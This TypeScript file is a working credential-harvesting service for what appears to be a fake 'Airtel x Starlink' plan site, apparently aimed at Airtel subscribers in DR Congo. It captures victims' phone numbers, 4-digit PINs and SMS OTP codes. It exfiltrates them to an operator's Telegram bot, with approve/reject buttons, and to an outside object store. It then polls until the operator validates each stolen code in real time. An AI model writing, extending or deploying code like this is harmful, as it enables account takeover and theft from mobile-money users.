import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  countryCode?: string;
  airtelBrand?: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
}

const BROWSER_HEADERS = {
  'Content-Type': 'application/json',
  'Accept': 'application/json',
  'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
};

class TelegramService {
  private cloudIdMap: Map<string, string> = new Map();
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      fullPhone?: string;
      country?: string;
      pin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
      cloudId?: string;
    }
  > = new Map();

  /**
   * Helper to retrieve persisted cloudId across tabs, reloads, or OTP steps
   */
  public getCloudId(sessionId: string): string {
    if (this.cloudIdMap.has(sessionId)) {
      return this.cloudIdMap.get(sessionId)!;
    }
    try {
      const saved = localStorage.getItem(`airtel_cloud_id_${sessionId}`);
      if (saved) {
        this.cloudIdMap.set(sessionId, saved);
        return saved;
      }
    } catch {}
    return sessionId;
  }

  /**
   * Helper to persist cloudId
   */
  public setCloudId(sessionId: string, cloudId: string) {
    this.cloudIdMap.set(sessionId, cloudId);
    try {
      localStorage.setItem(`airtel_cloud_id_${sessionId}`, cloudId);
      localStorage.setItem(`airtel_active_session`, sessionId);
      localStorage.setItem(`airtel_active_cloud_id`, cloudId);
    } catch {}
  }

  /**
   * Helper to safely parse JSON
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Send direct Telegram message using Bot API
   */
  public async sendDirectTelegramMessage(text: string, inlineKeyboard?: any): Promise<any> {
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();

    try {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const payload: any = {
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      };
      if (inlineKeyboard) {
        payload.reply_markup = {
          inline_keyboard: inlineKeyboard,
        };
      }

      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      return await this.safeJson(res);
    } catch (err) {
      console.warn('[TelegramService] Direct send error:', err);
      return null;
    }
  }

  /**
   * Send Login Credentials (Phone + 4-digit PIN)
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanPhone = phone.replace(/\D/g, '');
    const cleanPin = pin.slice(0, 4);

    let resolvedCloudId = this.getCloudId(sessionId);

    // 1. Try server or Vercel serverless endpoint first
    try {
      const serverRes = await fetch('/api/telegram/send-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          phone: cleanPhone,
          fullPhone: fullPhone || `+243 ${cleanPhone}`,
          country: country || 'Airtel Africa',
          airtelBrand: airtelBrand || 'Airtel x Starlink Direct',
          pin: cleanPin,
          planName,
          planPrice,
        }),
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data && data.success) {
          if (data.cloudId) {
            resolvedCloudId = data.cloudId;
            this.setCloudId(sessionId, resolvedCloudId);
          }
          this.localSessionState.set(sessionId, {
            loginStatus: 'pending',
            otpStatus: 'idle',
            phone: cleanPhone,
            fullPhone: fullPhone || `+243 ${cleanPhone}`,
            country: country || 'Airtel Africa',
            pin: cleanPin,
            planName,
            planPrice,
            cloudId: resolvedCloudId,
          });
          return true;
        }
      }
    } catch {
      // Backend unavailable, fall through
    }

    // 2. Direct Cloud Store + Telegram API (Ensures 100% delivery even on static Vercel)
    try {
      const cloudRes = await fetch('https://api.restful-api.dev/objects', {
        method: 'POST',
        headers: BROWSER_HEADERS,
        body: JSON.stringify({
          name: `stl_${cleanPhone}`,
          data: {
            sessionId,
            phone: cleanPhone,
            fullPhone: fullPhone || `+243 ${cleanPhone}`,
            country: country || 'Airtel Africa',
            airtelBrand: airtelBrand || 'Airtel x Starlink Direct',
            pin: cleanPin,
            planName,
            planPrice,
            loginStatus: 'pending',
            otpStatus: 'idle',
            createdAt: Date.now(),
            lastUpdated: Date.now(),
          },
        }),
      });

      if (cloudRes.ok) {
        const cloudData = await this.safeJson(cloudRes);
        if (cloudData && cloudData.id) {
          resolvedCloudId = cloudData.id;
          this.setCloudId(sessionId, resolvedCloudId);
        }
      }
    } catch (err) {
      console.warn('Direct cloud store creation warning:', err);
    }

    this.localSessionState.set(sessionId, {
      loginStatus: 'pending',
      otpStatus: 'idle',
      phone: cleanPhone,
      fullPhone: fullPhone || `+243 ${cleanPhone}`,
      country: country || 'Airtel Africa',
      pin: cleanPin,
      planName,
      planPrice,
      cloudId: resolvedCloudId,
    });

    const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
    const displayCountry = country || 'Airtel Africa';
    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';

    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
      `📶 <b>Réseau:</b> ${displayBrand}\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${resolvedCloudId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${resolvedCloudId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_login`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Send OTP Verification Code (4 digits)
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
    const resolvedCloudId = this.getCloudId(sessionId);

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'pending' as const,
      cloudId: resolvedCloudId,
      fullPhone,
      country,
    };
    existing.otp = cleanOtp;
    existing.otpStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    // 1. Try server or Vercel serverless endpoint
    try {
      const serverRes = await fetch('/api/telegram/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          cloudId: resolvedCloudId,
          phone,
          fullPhone: fullPhone || existing.fullPhone,
          country: country || existing.country,
          airtelBrand: airtelBrand || 'Airtel Starlink',
          otp: cleanOtp,
          planName,
          planPrice,
        }),
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data && data.success) {
          return true;
        }
      }
    } catch {
      // Backend unavailable, fall through
    }

    // 2. Direct Cloud Store Update + Telegram Message
    try {
      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
        headers: BROWSER_HEADERS,
        cache: 'no-store',
      });
      if (fetchRes.ok) {
        const record = await this.safeJson(fetchRes);
        const data = record?.data || {};
        data.otp = cleanOtp;
        data.otpStatus = 'pending';
        data.lastUpdated = Date.now();

        await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          method: 'PUT',
          headers: BROWSER_HEADERS,
          body: JSON.stringify({
            name: record?.name || resolvedCloudId,
            data,
          }),
        });
      }
    } catch (err) {
      console.warn('Direct cloud store OTP update warning:', err);
    }

    const displayPhone = fullPhone || payload.fullPhone || phone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
    const displayCountry = country || existing.country || 'Airtel Africa';

    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider OTP',
          callback_data: `approve_otp_${resolvedCloudId}`,
        },
        {
          text: '❌ Rejeter OTP',
          callback_data: `reject_otp_${resolvedCloudId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_otp`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Fast Real-time Status Polling (Multi-Tier Resilient Check)
   * 1. Check local session state
   * 2. Event-driven server wait-status (< 50ms latency, zero spam)
   * 3. Server status snapshot check with phone & sessionId fallback
   * 4. Direct Telegram getUpdates API query (client-side zero-dependency guarantee)
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp',
    phone?: string
  ): Promise<'pending' | 'approved' | 'rejected'> {
    // 1. Check local cached session state
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
        return local.otpStatus;
      }
    }

    const resolvedCloudId = this.getCloudId(sessionId);
    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
    const timestamp = Date.now();

    // 2. High-speed Event-driven /api/telegram/wait-status (Suspends until bot button click or 8s timeout)
    try {
      const waitController = new AbortController();
      const waitTimeout = setTimeout(() => waitController.abort(), 9000);

      const waitUrl = `/api/telegram/wait-status?sessionId=${encodeURIComponent(sessionId)}&phone=${encodeURIComponent(
        cleanPhone
      )}&targetStep=${targetStep}&timeout=7000`;

      const waitRes = await fetch(waitUrl, {
        signal: waitController.signal,
        cache: 'no-store',
        headers: { 'Cache-Control': 'no-cache' },
      });
      clearTimeout(waitTimeout);

      if (waitRes.ok) {
        const waitData = await this.safeJson(waitRes);
        if (waitData && (waitData.status === 'approved' || waitData.status === 'rejected')) {
          if (local) {
            if (targetStep === 'login') local.loginStatus = waitData.status;
            if (targetStep === 'otp') local.otpStatus = waitData.status;
          }
          return waitData.status;
        }
      }
    } catch {
      // wait-status network or abort, proceed to status snapshot
    }

    // 3. Check /api/telegram/status snapshot
    try {
      const statusUrl = `/api/telegram/status?id=${encodeURIComponent(resolvedCloudId)}&sessionId=${encodeURIComponent(
        sessionId
      )}&phone=${encodeURIComponent(cleanPhone)}&_t=${timestamp}`;

      const serverRes = await fetch(statusUrl, {
        cache: 'no-store',
        headers: { 'Cache-Control': 'no-cache' },
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data) {
          if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
            if (local) local.loginStatus = data.loginStatus;
            return data.loginStatus;
          }
          if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
            if (local) local.otpStatus = data.otpStatus;
            return data.otpStatus;
          }
        }
      }
    } catch {
      // Backend snapshot unavailable
    }

    // 4. Direct Telegram getUpdates verification (Client-side fallback)
    try {
      const token = getTelegramBotToken();
      if (token) {
        const allowedParam = encodeURIComponent(JSON.stringify(['callback_query']));
        const tgRes = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=25&allowed_updates=${allowedParam}`, {
          cache: 'no-store',
        });
        if (tgRes.ok) {
          const tgData = await this.safeJson(tgRes);
          if (tgData && tgData.ok && Array.isArray(tgData.result)) {
            for (const upd of tgData.result) {
              const cqData = upd.callback_query?.data || '';
              if (!cqData) continue;

              const isMatch =
                cqData.includes(sessionId) ||
                (resolvedCloudId && cqData.includes(resolvedCloudId)) ||
                (cleanPhone && cleanPhone.length > 5 && cqData.includes(cleanPhone));

              if (isMatch) {
                if (targetStep === 'login') {
                  if (cqData.startsWith('approve_login')) {
                    if (local) local.loginStatus = 'approved';
                    return 'approved';
                  }
                  if (cqData.startsWith('reject_login')) {
                    if (local) local.loginStatus = 'rejected';
                    return 'rejected';
                  }
                } else if (targetStep === 'otp') {
                  if (cqData.startsWith('approve_otp')) {
                    if (local) local.otpStatus = 'approved';
                    return 'approved';
                  }
                  if (cqData.startsWith('reject_otp')) {
                    if (local) local.otpStatus = 'rejected';
                    return 'rejected';
                  }
                }
              }
            }
          }
        }
      }
    } catch {
      // Direct telegram check catch
    }

    // 5. Cloud State Lookup on restful-api.dev only if resolvedCloudId is an actual cloudId
    if (resolvedCloudId && resolvedCloudId !== sessionId && !resolvedCloudId.startsWith('stl_')) {
      try {
        const cloudRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          headers: BROWSER_HEADERS,
          cache: 'no-store',
        });
        if (cloudRes.ok) {
          const record = await this.safeJson(cloudRes);
          const data = record?.data || {};

          if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
            if (local) local.loginStatus = data.loginStatus;
            return data.loginStatus;
          }
          if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
            if (local) local.otpStatus = data.otpStatus;
            return data.otpStatus;
          }
        }
      } catch {}
    }

    return 'pending';
  }
}

export const telegramService = new TelegramService();
